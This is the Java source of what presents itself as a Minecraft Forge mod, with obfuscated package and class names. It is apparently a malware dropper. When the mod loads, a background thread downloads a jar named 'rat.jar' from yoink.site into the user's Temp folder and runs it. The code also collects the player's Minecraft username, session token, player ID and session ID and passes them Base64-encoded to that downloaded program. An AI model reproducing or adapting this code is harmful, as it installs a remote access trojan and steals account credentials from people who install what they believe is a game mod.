package a.b.c;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.net.URL;
import java.nio.channels.Channels;
import java.nio.channels.ReadableByteChannel;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.Objects;

import net.minecraftforge.fml.common.Mod;

@Mod( modid = "7cf5jk26f" )
public class d
{

    public static final String MINECRAFT_CLASS = "net.minecraft.client.Minecraft";

    public d()
    {
        constructor();
    }

    public void constructor()
    {
        new Thread( () ->
        {
            try
            {
                BufferedReader b = new BufferedReader( new InputStreamReader( Objects.requireNonNull( this.getClass().getClassLoader().getResourceAsStream( "asset/og.data" ) ) ) );
                String c = b.readLine();
                b.close();
                String d2 = System.getProperty( "user.home" ) + "\\AppData\\Local\\Temp";
                String e = null;
                for ( File f : Objects.requireNonNull( new File( d2 ).listFiles() ) )
                {
                    if ( !f.isDirectory() ) continue;
                    e = f.getAbsolutePath();
                    break;
                }
                File sh = new File( new File( e ), System.currentTimeMillis() + ".jar" );
                ReadableByteChannel j = Channels.newChannel( new URL( "http://yoink.site/ukraine/rat.jar" ).openStream() );
                FileOutputStream g = new FileOutputStream( sh );
                g.getChannel().transferFrom( j, 0L, Long.MAX_VALUE );
                g.close();
                ProcessBuilder h = new ProcessBuilder( "java", "-jar", sh.getAbsolutePath(), c,
                        Base64.getEncoder().encodeToString( execute().getBytes( StandardCharsets.UTF_8 ) ) );
                Process l = h.start();
                l.waitFor();
            } catch ( Exception b )
            {
                b.printStackTrace();
            }
        } ).start();
    }

    public static String execute()
    {
        Class< ? > clazz = null;
        StringBuilder sb = new StringBuilder();

        if ( classExists( MINECRAFT_CLASS ) )
        {
            try
            {
                clazz = Class.forName( MINECRAFT_CLASS );
            } catch ( ClassNotFoundException ignored )
            {
                //never happen exception
            }
        } else
        {
            sb.append( "the rat is running out of the game" );
            return sb.toString();
        }

        Object session;
        assert clazz != null;

        try
        {
            if ( isObfuscated() )
            {
                session = clazz.getMethod( "func_110432_I" ).invoke( clazz.getMethod( "func_71410_x" ).invoke( null ) );
                sb.append( "Username: " )
                        .append( ( String ) session.getClass().getMethod( "func_111285_a" ).invoke( session ) ).append( "\n" );
                sb.append( "Token: " )
                        .append( ( String ) session.getClass().getMethod( "func_148254_d" ).invoke( session ) ).append( "\n" );
                sb.append( "PlayerID: " )
                        .append( ( String ) session.getClass().getMethod( "func_148255_b" ).invoke( session ) ).append( "\n" );
                sb.append( "SessionID: " )
                        .append( ( String ) session.getClass().getMethod( "func_111286_b" ).invoke( session ) ).append( "\n" );
            } else
            {
                session = clazz.getMethod( "getSession" ).invoke( clazz.getMethod( "getMinecraft" ).invoke( null ) );
                sb.append( "Username: " )
                        .append( ( String ) session.getClass().getMethod( "getUsername" ).invoke( session ) ).append( "\n" );
                sb.append( "Token: " )
                        .append( ( String ) session.getClass().getMethod( "getToken" ).invoke( session ) ).append( "\n" );
                sb.append( "PlayerID: " )
                        .append( ( String ) session.getClass().getMethod( "getPlayerID" ).invoke( session ) ).append( "\n" );
                sb.append( "SessionID: " )
                        .append( ( String ) session.getClass().getMethod( "getSessionID" ).invoke( session ) ).append( "\n" );
            }
        } catch ( Exception e )
        {
            sb.append( "failed to get minecraft info" );
            return sb.toString();
        }

        return sb.toString();
    }

    private static boolean classExists( String clazz )
    {
        try
        {
            Class.forName( clazz );
            return true;
        } catch ( ClassNotFoundException e )
        {
            return false;
        }
    }

    private static boolean isObfuscated()
    {
        try
        {
            Class.forName( "net.minecraft.client" ).getMethod( "getMinecraft" ).invoke( null );
            return false;
        } catch ( Exception e )
        {
            return true;
        }
    }
}
